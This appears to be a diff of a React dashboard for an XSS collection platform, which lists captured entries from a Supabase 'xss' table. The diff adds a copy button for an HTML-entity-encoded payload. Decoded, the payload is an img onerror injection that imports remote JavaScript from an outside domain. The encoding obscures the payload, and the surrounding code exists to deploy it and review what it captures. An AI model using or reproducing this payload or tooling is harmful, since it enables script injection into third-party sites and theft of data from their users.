@@ -7,6 +7,7 @@ export default function DisplayTable() {
   const [data, setData] = useState([]);
   const [expandedRows, setExpandedRows] = useState({}); // 用于跟踪哪些行的内容被展开
   const [selectedImage, setSelectedImage] = useState(null); // 用于存储当前选中的图片
+  const [showCopySuccess, setShowCopySuccess] = useState(false); // 控制复制成功的提示显示
 
   // 在组件加载时从 Supabase 获取数据
   useEffect(() => {
@@ -55,7 +56,8 @@ export default function DisplayTable() {
 
       const { error } = await supabase
         .from('xss')
-        .delete().neq('id', 0);
+        .delete()
+        .neq('id', 0);
 
       if (error) {
         console.error('删除所有数据时出错:', error);
@@ -70,6 +72,28 @@ export default function DisplayTable() {
     }
   };
 
+  // HTML 解码函数
+  const decodeHtml = (html) => {
+    const txt = document.createElement('textarea');
+    txt.innerHTML = html;
+    return txt.value;
+  };
+
+  // 复制字符串到剪贴板
+  const handleCopy = (text) => {
+    const decodedText = decodeHtml(text); // 解码 HTML 实体
+    navigator.clipboard.writeText(decodedText).then(
+      () => {
+        setShowCopySuccess(true); // 显示复制成功的提示
+        setTimeout(() => setShowCopySuccess(false), 1000); // 0.5秒后隐藏提示
+      },
+      (err) => {
+        console.error('复制失败:', err);
+        alert('复制失败，请重试');
+      }
+    );
+  };
+
   // 切换展开/收起状态
   const toggleExpand = (id) => {
     setExpandedRows((prev) => ({
@@ -81,6 +105,25 @@ export default function DisplayTable() {
   return (
     <div style={styles.container}>
       <h1 style={styles.title}>XSS 数据表</h1>
+
+      {/* 居中的 span 和复制按钮 */}
+      <div style={styles.codeContainer}>
+        <span style={styles.codeSpan}>
+          &#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#34;&#105;&#109;&#112;&#111;&#114;&#116;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#98;&#101;&#105;&#115;&#104;&#97;&#110;&#120;&#117;&#101;&#121;&#117;&#97;&#110;&#46;&#99;&#111;&#109;&#47;&#50;&#46;&#106;&#115;&#39;&#41;&#34;&#62;
+        </span>
+        <button
+          onClick={() =>
+            handleCopy(
+              "&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#34;&#105;&#109;&#112;&#111;&#114;&#116;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#98;&#101;&#105;&#115;&#104;&#97;&#110;&#120;&#117;&#101;&#121;&#117;&#97;&#110;&#46;&#99;&#111;&#109;&#47;&#50;&#46;&#106;&#115;&#39;&#41;&#34;&#62;"
+            )
+          }
+          style={styles.copyButton}
+        >
+          复制
+        </button>
+        {/* 复制成功提示 */}
+        {showCopySuccess && <div style={styles.copySuccess}>复制成功</div>}
+      </div>
 
       {/* 添加“全部删除”按钮 */}
       <button onClick={handleDeleteAll} style={styles.deleteAllButton}>
@@ -180,6 +223,41 @@ const styles = {
     marginBottom: '20px',
     fontSize: '24px',
     color: '#333',
+  },
+  codeContainer: {
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    marginBottom: '20px',
+    position: 'relative', // 确保复制成功提示可以相对定位
+  },
+  codeSpan: {
+    backgroundColor: '#f4f4f4',
+    padding: '10px',
+    borderRadius: '5px',
+    marginRight: '10px',
+    fontFamily: 'monospace',
+    fontSize: '14px',
+  },
+  copyButton: {
+    padding: '5px 10px',
+    backgroundColor: '#007bff',
+    color: '#fff',
+    border: 'none',
+    borderRadius: '5px',
+    cursor: 'pointer',
+    fontSize: '14px',
+  },
+  copySuccess: {
+    position: 'absolute',
+    top: '-30px', // 提示显示在按钮上方
+    right: '0',
+    backgroundColor: '#28a745',
+    color: '#fff',
+    padding: '5px 10px',
+    borderRadius: '5px',
+    fontSize: '12px',
+    boxShadow: '0 2px 5px rgba(0, 0, 0, 0.2)',
   },
   deleteAllButton: {
     display: 'block',
